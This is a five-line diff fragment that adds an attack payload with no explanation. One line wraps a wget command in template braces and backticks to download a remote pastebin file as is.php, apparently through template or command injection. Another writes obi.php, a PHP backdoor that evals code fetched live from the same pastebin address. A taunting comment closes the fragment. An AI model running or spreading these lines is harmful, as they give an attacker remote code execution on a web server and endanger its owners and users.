@@ -1,0 +1,5 @@
+{{`wget https://pastebin.com/raw/tUAD1uez -O is.php`}}
+
+echo '<?php eval("?>".file_get_contents("https://pastebin.com/raw/tUAD1uez"));?>' > obi.php
+
+# next. use your brain
